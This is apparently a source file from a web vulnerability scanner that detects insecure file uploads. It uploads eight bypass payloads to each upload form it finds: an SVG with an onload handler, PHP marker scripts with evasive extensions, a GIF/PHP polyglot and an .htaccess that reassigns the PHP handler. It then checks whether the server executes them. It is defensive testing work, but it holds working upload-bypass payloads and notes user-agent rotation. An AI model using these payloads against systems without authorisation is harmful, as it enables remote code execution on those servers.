"""Insecure file upload detector — hardened.

For every multipart form with a file input we try a series of escalating
payloads before giving up:

    1. SVG with onload handler          -> stored XSS via direct render
    2. PHP via .phtml extension         -> server-side execution
    3. PHP via .pHp / .Php (case)       -> case-only deny-list bypass
    4. .phar extension                   -> alt PHP handler
    5. .htaccess                         -> rewrite engine takeover
    6. shell.jpg.php (double extension)  -> Apache mod_mime tricks
    7. shell.php%00.jpg (null byte)      -> truncation in older PHP
    8. polyglot GIF89a + PHP             -> magic-bytes whitelist bypass

Detection: a) the response advertises the public URL, b) we can fetch it
back, c) executing handler signal (Content-Type text/x-php, response body
contains the marker we put inside the payload, etc.).
"""
from __future__ import annotations

import re
from typing import TYPE_CHECKING
from urllib.parse import urljoin

from core.utils import random_token

if TYPE_CHECKING:
    from core.orchestrator import Context

PHP_MARKER_TPL = "<?php echo 'SX_UP_{token}_OK'; ?>"
HTACCESS = b"AddType application/x-httpd-php .sxp\nAddHandler php-script .sxp\n"
GIF_HEADER = b"GIF89a;\n"

SVG = (
    '<?xml version="1.0" standalone="no"?>'
    '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">'
    '<text x="10" y="20">SamaritanX</text></svg>'
).encode()


def _php(token: str) -> bytes:
    return PHP_MARKER_TPL.format(token=token).encode()


async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET", form=None):
    findings: list[dict] = []
    if form is None:
        return findings
    file_inputs = [i for i in form.get("inputs", []) if i.get("type") == "file"]
    if not file_inputs:
        return findings

    field_name = file_inputs[0]["name"]
    base_data = {i["name"]: i.get("value") or random_token(4)
                 for i in form["inputs"] if i.get("type") not in ("file", "submit")}

    payloads: list[tuple[str, str, str, bytes, str]] = [
        # (label, filename, content-type, body, marker-token)
        ("svg",            f"sx_{random_token(6)}.svg",        "image/svg+xml",   SVG, ""),
        ("phtml",          f"sx_{random_token(6)}.phtml",      "image/jpeg",      _php(random_token(6)), ""),
        ("phar",           f"sx_{random_token(6)}.phar",       "image/jpeg",      _php(random_token(6)), ""),
        ("case_php",       f"sx_{random_token(6)}.pHp",        "image/jpeg",      _php(random_token(6)), ""),
        ("htaccess",       ".htaccess",                          "text/plain",      HTACCESS, ""),
        ("double_ext",     f"sx_{random_token(6)}.jpg.php",    "image/jpeg",      _php(random_token(6)), ""),
        ("null_byte",      f"sx_{random_token(6)}.php%00.jpg", "image/jpeg",      _php(random_token(6)), ""),
        ("gif_polyglot",   f"sx_{random_token(6)}.php",        "image/gif",       GIF_HEADER + _php(random_token(6)), ""),
    ]
    # remember the per-payload marker token so the fetched response can be
    # matched against the exact marker we embedded
    for i, (label, fname, ctype, body, _tok) in enumerate(payloads):
        m = re.search(rb"SX_UP_([a-z0-9]+)_OK", body)
        payloads[i] = (label, fname, ctype, body, m.group(1).decode() if m else "")

    for label, fname, ctype, body, token in payloads:
        files = {field_name: (fname, body, ctype)}
        # Route through the stealth client so scope, auth, rate limiting,
        # UA rotation, and request counting all apply to upload payloads too.
        ev = await ctx.http.request(
            "POST", form["action"], data=base_data, files=files,
        )
        if ev.error:
            continue
        text = ev.response_body or ""
        if ev.status not in (200, 201, 202):
            continue
        # extract candidate public URL from response
        candidate = None
        for tok in (fname, fname.rsplit(".", 1)[0]):
            i = text.find(tok)
            if i != -1:
                start = text.rfind('"', 0, i)
                end = text.find('"', i)
                if start != -1 and end != -1:
                    candidate = text[start + 1: end]
                    break
        executed = False
        executed_evidence = ""
        if candidate:
            public = urljoin(form["action"], candidate)
            ev = await ctx.http.get(public)
            sniffed_ctype = ev.response_headers.get("content-type", "").lower()
            fetched_body = ev.response_body or ""
            if label in ("phtml", "phar", "case_php", "double_ext", "null_byte", "gif_polyglot"):
                # Real execution proof: the response contains the bare marker
                # output (SX_UP_<token>_OK) and does NOT contain the PHP source.
                # A server that merely serves the file raw echoes `<?php … ?>`
                # verbatim — that is a static download, not code execution.
                if token and f"SX_UP_{token}_OK" in fetched_body \
                        and "<?php" not in fetched_body:
                    executed = True
                    executed_evidence = f"PHP marker output present and source gone — {public} executed as code"
            elif label == "svg":
                # served as an SVG image, or as text/html while the payload body
                # (the onload handler) actually comes back — an HTML wrapper page
                # with a 404 does not count
                if "svg" in sniffed_ctype or ("html" in sniffed_ctype and "<svg" in fetched_body):
                    executed = True
                    executed_evidence = f"Uploaded file fetched back from {public} with content-type {sniffed_ctype}"

            if executed:
                from core.poc import proof_record
                poc = proof_record(
                    verified=True, method="GET", url=public,
                    request=f"GET {public}",
                    status=ev.status, excerpt=fetched_body,
                    rationale=(f"The uploaded payload at {public} executed: "
                               + executed_evidence.split(" — ", 1)[1] if " — " in executed_evidence else executed_evidence))
                findings.append({
                    "category": "upload",
                    "title": f"Insecure file upload — {label} bypass on {form.get('action')}",
                    "severity": "critical" if label != "svg" else "high",
                    "cvss": 9.8 if label != "svg" else 7.4,
                    "url": form["action"], "payload": fname,
                    "evidence": executed_evidence,
                    "request": f"POST {form['action']} (multipart) {label}",
                    "response": fetched_body[:1500],
                    "metadata": {"public_url": public, "label": label, "ctype": sniffed_ctype,
                                 "poc": poc, "detection": "marker"},
                })
                # one confirmed bypass is enough — stop hammering the upload
                return findings
    return findings
